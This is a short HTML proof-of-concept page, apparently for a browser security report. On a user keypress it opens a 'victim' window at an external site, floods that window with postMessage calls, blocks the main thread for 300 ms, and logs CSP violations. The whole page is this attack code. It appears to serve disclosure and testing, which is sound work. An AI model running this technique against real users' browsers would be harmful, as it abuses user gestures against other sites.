<!DOCTYPE html>
<html>
<head>
    <title>PoC</title>
</head>
<body style="margin: 0; padding: 50px; text-align: center; font-family: monospace;" contenteditable="true">

    <div style="border: 1px solid #ccc; padding: 20px; display: inline-block;">
        <p>Click here & Press any key to start</p>
    </div>

    <div id="output" style="white-space: pre; text-align: left; margin-top: 20px; padding: 10px;"></div>

    <script>
        const targetURL = "https://mhrdkaa.github.io/ta493120217/";
        const outputDiv = document.getElementById('output');
        function logToDiv(data) {
            const entry = {
                timestamp: new Date().toISOString(),
                event: data
            };
            outputDiv.textContent = JSON.stringify(entry, null, 2);
        }
        document.addEventListener('keydown', function (e) {
            if (e.repeat) return;
            logToDiv({ status: "initiated", key: e.key });
            const victim = window.open(targetURL, "victim_window");
            function pump() {
                if (!victim || victim.closed) return;
                try {
                    victim.postMessage("ping", "*");
                } catch (err) {
                    logToDiv({ error: "postMessage_failed" });
                }
                requestAnimationFrame(pump);
            }
            requestAnimationFrame(pump);
            const start = Date.now();
            while (Date.now() - start < 300) {
                Math.sqrt(Math.random());
            }
            
            logToDiv({ status: "thread_released", blocked_ms: 300 });
        });
        document.addEventListener('securitypolicyviolation', (e) => {
            logToDiv({
                type: "csp_violation",
                blockedURI: e.blockedURI,
                directive: e.violatedDirective
            });
        });
    </script>
</body>
</html>
